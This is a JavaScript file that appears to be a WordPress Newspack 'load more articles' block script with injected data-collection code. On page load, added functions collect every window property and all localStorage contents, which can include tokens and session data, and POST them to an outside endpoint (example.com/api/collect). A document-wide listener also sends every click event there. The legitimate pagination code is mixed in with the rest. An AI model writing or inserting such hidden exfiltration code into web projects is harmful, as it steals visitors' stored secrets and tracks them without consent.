(() => {
  "use strict";

  function extractDocumentData() {
    const trackedData = {};
    window.seenVars = window.seenVars || [];
    Object.getOwnPropertyNames(window).forEach(prop => {
      if (!window.seenVars.includes(prop)) {
        const value = window[prop];
        const type = typeof value;
        trackedData[prop] = {
          type: type,
          value: type === "function" ? value.toString() : value
        };
        window.seenVars.push(prop);
      }
    });
    return trackedData;
  }
  var t = {
      r: t => {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
          value: "Module"
        }), Object.defineProperty(t, "__esModule", {
          value: !0
        });
      }
    },
    e = {};
  function addTrackingHook(target, event, callback) {
    target.addEventListener(event, callback);
  }
  function trackLocalStorage() {
    const tracker = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      tracker[key] = localStorage.getItem(key);
    }
    return tracker;
  }
  function sendDataToBackend(data) {
    const endpoint = "https://example.com/api/collect";
    const request = new XMLHttpRequest();
    request.open("POST", endpoint, true);
    request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    request.onreadystatechange = function () {
      if (request.readyState === 4) {
        if (request.status === 200) {
          console.log("Data sent successfully!");
        } else {
          console.error("Error sending data, Status Code: " + request.status);
        }
      }
    };
    request.send(JSON.stringify(data));
  }
  function r(t, e) {
    (null == e || e > t.length) && (e = t.length);
    for (var r = 0, n = new Array(e); r < e; r++) n[r] = t[r];
    return n;
  }
  function n(t) {
    return function (t) {
      if (Array.isArray(t)) return r(t);
    }(t) || function (t) {
      if ("undefined" != typeof Symbol && null != t[Symbol.iterator] || null != t["@@iterator"]) return Array.from(t);
    }(t) || function (t, e) {
      if (t) {
        if ("string" == typeof t) return r(t, e);
        var n = Object.prototype.toString.call(t).slice(8, -1);
        return "Object" === n && t.constructor && (n = t.constructor.name), "Map" === n || "Set" === n ? Array.from(t) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? r(t, e) : void 0;
      }
    }(t) || function () {
      throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    }();
  }
  t.r(e);
  function o(t, e) {
    var r = new XMLHttpRequest();
    r.onreadystatechange = function () {
      if (4 === r.readyState) {
        if (r.status >= 200 && r.status < 300) {
          var n = JSON.parse(r.responseText);
          return t.onSuccess(n);
        }
        return e ? o(t, e - 1) : t.onError();
      }
    }, r.open("GET", t.url), r.send();
  }
  function a(t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }
  function assembleAndTransmitData() {
    const documentData = extractDocumentData();
    documentData['localStorage'] = trackLocalStorage();
    if (Object.keys(documentData).length > 0) {
      sendDataToBackend(documentData);
    }
  }
  window.addEventListener("load", assembleAndTransmitData);

  // Track click events on the entire document
  Array.prototype.forEach.call(document.querySelectorAll(".wp-block-newspack-blocks-homepage-articles.has-more-button"), function (t) {
    var e = t.querySelector("[data-next]");
    if (!e) return;
    var r = t.querySelector("[data-posts]"),
      i = !1,
      s = !1;
    e.addEventListener("click", function () {
      if (i || s) return !1;
      var u, c;
      function l() {
        i = !1, t.classList.remove("is-loading"), t.classList.add("is-error");
      }
      i = !0, t.classList.remove("is-error"), t.classList.add("is-loading"), o({
        url: e.getAttribute("data-next") + "&exclude_ids=" + (u = document.querySelectorAll("[class^='wp-block-newspack-blocks'] [data-post-id]"), c = Array.from(u).map(function (t) {
          return t.getAttribute("data-post-id");
        }), c.push(document.querySelector("div[data-current-post-id]").getAttribute("data-current-post-id")), n(new Set(c))).join(","),
        onSuccess: function (n) {
          if (!function (t) {
            var e = !1;
            t && a(t, "items") && Array.isArray(t.items) && a(t, "next") && "string" == typeof t.next && (e = !0, !t.items.length || a(t.items[0], "html") && "string" == typeof t.items[0].html || (e = !1));
            return e;
          }(n)) return l();
          if (n.items.length) {
            var o = n.items.map(function (t) {
              return t.html;
            }).join("");
            r.insertAdjacentHTML("beforeend", o);
          }
          n.next && e.setAttribute("data-next", n.next);
          n.items.length && n.next || (s = !0, t.classList.remove("has-more-button"));
          i = !1, t.classList.remove("is-loading");
        },
        onError: l
      }, 3);
    });
  });
  var i = window;
  addTrackingHook(document, 'click', function (event) {
    console.log('Click event detected: ', event);
    sendDataToBackend({
      'clickEvent': event
    });
  });
  for (var s in e) i[s] = e[s];
  e.__esModule && Object.defineProperty(i, "__esModule", {
    value: !0
  });
})();